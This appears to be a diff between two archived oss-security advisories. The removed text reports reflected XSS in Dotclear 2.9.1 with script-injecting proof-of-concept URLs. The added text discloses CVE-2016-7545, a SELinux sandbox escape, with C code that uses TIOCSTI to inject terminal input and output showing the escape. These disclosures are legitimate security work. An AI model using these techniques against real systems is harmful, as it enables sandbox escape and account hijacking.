@@ -1,46 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/02/3
-Message-ID: <6D072F0A5597B449BEE8A9770E0BDBEA018CFE1E@EX01.corp.qihoo.net>
-Date: Tue, 2 Aug 2016 06:13:03 +0000
-From: 陈瑞琦 <chenruiqi@....cn>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-CC: limingxing <limingxing@....cn>
-Subject: CVE request: XSS vulns in Dotclear v2.9.1
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/25/1
+Message-ID: <20160925134911.18991732ntfvg5a8@webmail.alunos.dcc.fc.up.pt>
+Date: Sun, 25 Sep 2016 13:49:11 +0200
+From: up201407890@...nos.dcc.fc.up.pt
+To: oss-security@...ts.openwall.com
+Subject: CVE-2016-7545 -- SELinux sandbox escape
 Content-Type: text/plain; charset=utf-8
 
-I found some XSS vulns in Dotclear v2.9.1
+Hi,
 
-Title: XSS vulns in Dotclear v2.9.1
-Author: Chen Ruiqi, Chenruiqi@....cn
-Date: 2016-08-01
-Download Site: https://dotclear.org/download
-Vendor: dotclear.org
-Vendor Notified: 2016-08-01
-Vendor Contact: security@...clear.net
---------------------------------------------------------------------------------------------------------
-Discription:
-Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)
------------------------------------------------------------------------------------------------------------
-Vulnerability:
-There are two reflected XSS vulns in Dotclear v2.9.1 media manager
+When executing a program via the SELinux sandbox, the nonpriv session
+can escape to the parent session by using the TIOCSTI ioctl to push
+characters into the terminal's input buffer, allowing an attacker to
+escape the sandbox.
 
-/admin/media.php
-line 34 $link_type = !empty($_REQUEST['link_type']) ? $_REQUEST['link_type'] : null;
-line 62 $q = isset($_REQUEST['q']) ? $_REQUEST['q'] : null;
+$ cat test.c
+#include <unistd.h>
+#include <sys/ioctl.h>
 
-Lack of filter before put the user-input into the page.
---------------------------------------------------------------------------------------------------------
-PoC Code:
-http://*.*.*.*/dotclear/admin/media.php?q=77777%3C%2Fspan%3E%3Cscript%3Ealert(1)%3C/script%3E&popup=0&select=0&plugin_id=&post_id=&link_type=
-http://*.*.*.*/dotclear/admin/media.php?q=77777&popup=0&select=0&plugin_id=&post_id=&link_type=8888%22%3E%3Cscript%3Ealert(1)%3C/script%3E
-----------------------------------------------------------------------------------------------------------
-Fix Code:
-https://hg.dotclear.org/dotclear/rev/40d0207e520d
+int main()
+{
+     char *cmd = "id\n";
+     while(*cmd)
+      ioctl(0, TIOCSTI, cmd++);
+     execlp("/bin/id", "id", NULL);
+}
 
+$ gcc test.c -o test
+$ /bin/sandbox ./test
+id
+uid=1000 gid=1000 groups=1000
+context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
+$ id    <------ did not type this
+uid=1000(saken) gid=1000(saken) groups=1000(saken)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 
-Could you assign CVE id for those?
+Bug report:
+https://bugzilla.redhat.com/show_bug.cgi?id=1378577
 
-Thank you
+Upstream fix:
+https://marc.info/?l=selinux&m=147465160112766&w=2
+https://marc.info/?l=selinux&m=147466045909969&w=2
+https://github.com/SELinuxProject/selinux/commit/acca96a135a4d2a028ba9b636886af99c0915379
 
-Chen Ruiqi
-Codesafe Team
+Federico Bento.
+
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
+
